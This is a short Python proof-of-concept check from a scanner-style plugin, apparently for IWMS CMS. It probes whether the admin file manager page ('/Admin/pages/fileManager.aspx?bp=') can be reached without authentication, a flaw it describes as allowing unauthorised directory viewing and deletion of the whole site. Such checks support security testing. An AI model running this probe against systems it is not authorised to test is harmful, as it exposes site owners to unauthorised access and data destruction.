#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: IWMS系统后台绕过&整站删除
referer: http://www.wooyun.org/bugs/wooyun-2010-085284
author: Lucifer
description: 禁用JS可越权查看文件目录,并人容易删除文件。
'''
import sys
import requests
import warnings
from termcolor import cprint

class iwms_bypass_js_delete_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/Admin/pages/fileManager.aspx?bp="
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"btnCreateFolder" in req.text:
                cprint("[+]存在IWMS系统后台绕过&整站删除漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "IWMS系统后台绕过&整站删除", payload, req.text
            else:
                cprint("[-]不存在iwms_bypass_js_delete漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = iwms_bypass_js_delete_BaseVerify(sys.argv[1])
    testVuln.run()